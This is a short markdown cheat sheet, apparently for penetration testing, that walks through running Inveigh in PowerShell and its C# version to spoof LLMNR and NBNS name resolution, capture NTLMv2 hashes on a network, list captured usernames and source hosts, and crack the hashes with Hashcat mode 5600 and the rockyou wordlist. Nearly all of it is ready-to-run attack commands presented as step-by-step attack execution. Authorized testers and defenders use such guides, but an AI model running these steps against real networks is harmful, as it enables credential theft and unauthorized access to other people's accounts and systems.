---
legal-banner: true
---

### **Running Inveigh in PowerShell**

1. Load the Inveigh module into PowerShell:  
   ```powershell
   Import-Module .\Inveigh.ps1
   ```

2. Check available parameters for the `Invoke-Inveigh` cmdlet:  
   ```powershell
   (Get-Command Invoke-Inveigh).Parameters
   ```

3. Run Inveigh to start spoofing LLMNR and NBNS requests, with console and file output enabled:  
   ```powershell
   Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
   ```

### **Using InveighZero (C# Version)**

1. Run the C# version of Inveigh:  
   ```bash
   .\Inveigh.exe
   ```

2. Enter the interactive console: Press `ESC` to switch to interactive mode.  

3. Use the following commands within the console for specific information:  

   - Get one captured NTLMv2 hash per user:  
     ```bash
     GET NTLMV2UNIQUE
     ```

   - Get usernames and source IPs/hostnames:  
     ```bash
     GET NTLMV2USERNAMES
     ```

### **Step-by-Step Attack Execution**

1. Start Inveigh with default settings:  
   ```powershell
   Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
   ```

2. Use the console commands to view captured hashes and usernames.  

3. Captured hashes are saved in the specified output directory. By default, they are stored in:  
   ```plaintext
   C:\Tools
   ```

4. Prepare hashes for cracking. Ensure they are in a format compatible with Hashcat.  

5. Crack the hashes with Hashcat:  
   ```bash
   hashcat -m 5600 hash_file.txt /usr/share/wordlists/rockyou.txt
   ```
